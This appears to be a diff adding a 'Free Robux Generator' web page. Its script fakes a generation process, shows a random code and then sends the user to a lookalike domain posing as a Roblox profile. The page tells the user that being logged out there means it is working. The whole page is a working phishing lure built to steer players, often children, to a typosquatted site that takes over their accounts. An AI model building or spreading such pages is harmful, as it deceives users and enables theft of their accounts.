@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Robux Generator</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            text-align: center;
+            background: linear-gradient(135deg, #d9a7c7, #fffcdc);
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            padding: 30px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            display: inline-block;
+            max-width: 400px;
+            animation: fadeIn 1s ease-in-out;
+        }
+        .btn, .robux-btn {
+            padding: 14px 28px;
+            font-size: 18px;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: transform 0.2s ease-in-out, background 0.3s;
+            margin-top: 10px;
+            display: inline-block;
+            color: white;
+        }
+        .btn {
+            background: linear-gradient(135deg, #28a745, #218838);
+        }
+        .btn:hover {
+            background: linear-gradient(135deg, #218838, #1e7e34);
+            transform: scale(1.05);
+        }
+        .robux-btn {
+            background: linear-gradient(135deg, #ff9800, #f57c00);
+        }
+        .robux-btn:hover {
+            background: linear-gradient(135deg, #f57c00, #e65100);
+            transform: scale(1.05);
+        }
+        input {
+            padding: 12px;
+            width: 90%;
+            max-width: 350px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-top: 10px;
+            text-align: center;
+            font-size: 16px;
+        }
+        #message, #selectedAmount {
+            margin-top: 15px;
+            font-weight: bold;
+            color: #28a745;
+            font-size: 18px;
+            animation: fadeIn 1s ease-in-out;
+        }
+        .code {
+            font-size: 20px;
+            font-weight: bold;
+            color: #007bff;
+            margin-top: 10px;
+        }
+        .link {
+            display: inline-block;
+            margin-top: 20px;
+            font-size: 16px;
+            color: #fff;
+            background: linear-gradient(135deg, #007bff, #0056b3);
+            padding: 10px 20px;
+            border-radius: 5px;
+            text-decoration: none;
+            transition: transform 0.2s ease-in-out, background 0.3s;
+            animation: fadeIn 1s ease-in-out;
+        }
+        .link:hover {
+            background: linear-gradient(135deg, #0056b3, #004494);
+            transform: scale(1.05);
+        }
+        .hidden {
+            display: none;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Free Robux Generator</h1>
+        <p>Enter your username to generate unlimited Robux!</p>
+        <input type="text" id="username" placeholder="Enter Roblox Username">
+        <br>
+        <button class="btn" onclick="showRobuxOptions()">Continue</button>
+        <div id="robuxSelection" class="hidden">
+            <p>Select Robux Amount:</p>
+            <button class="robux-btn" onclick="setRobux(1000)">1,000</button>
+            <button class="robux-btn" onclick="setRobux(10000)">10,000</button>
+            <button class="robux-btn" onclick="setRobux(50000)">50,000</button>
+            <p id="selectedAmount">Selected Robux: None</p>
+            <button class="btn" onclick="generateRobux()">Generate</button>
+        </div>
+        <p id="message"></p>
+        <p id="code" class="code"></p>
+        <a id="redeemLink" class="link" style="display: none;" href="#">Click here to redeem</a>
+        <p id="instructions" class="hidden" style="margin-top: 20px; font-size: 16px; color: #555;"></p>
+    </div>
+    
+    <script>
+        let selectedRobux = 0;
+        
+        function showRobuxOptions() {
+            document.getElementById("robuxSelection").classList.remove("hidden");
+        }
+        
+        function setRobux(amount) {
+            selectedRobux = amount;
+            document.getElementById("selectedAmount").innerText = `Selected Robux: ${amount}`;
+        }
+        
+        function generateRobux() {
+            let username = document.getElementById("username").value;
+            if (username.trim() === "") {
+                alert("Please enter a valid username!");
+                return;
+            }
+            if (selectedRobux === 0) {
+                alert("Please select a Robux amount!");
+                return;
+            }
+            
+            let message = document.getElementById("message");
+            message.innerHTML = "Finding username...";
+            setTimeout(() => {
+                message.innerHTML = "Generating Robux...";
+                setTimeout(() => {
+                    message.innerHTML = "Error! Retrying...";
+                    setTimeout(() => {
+                        let code = Math.random().toString(36).substr(2, 8).toUpperCase();
+                        message.innerHTML = `<strong>Success!</strong> ${username}, you have received <span style='color: #28a745;'>${selectedRobux} Robux! Complete Last Step To Claim</span>.`;
+                        document.getElementById("code").innerHTML = `Your profile code: ${code}`;
+                        document.getElementById("redeemLink").style.display = "inline-block";
+                        document.getElementById("redeemLink").href = "https://www.roblox.com.ni/users/359166640605/profile";
+                        document.getElementById("instructions").innerText = "Go to the link and then click join. When joining, you might be logged out of your account. If you are, that means it is working.";
+                        document.getElementById("instructions").classList.remove("hidden");
+                    }, 1000);
+                }, 1000);
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
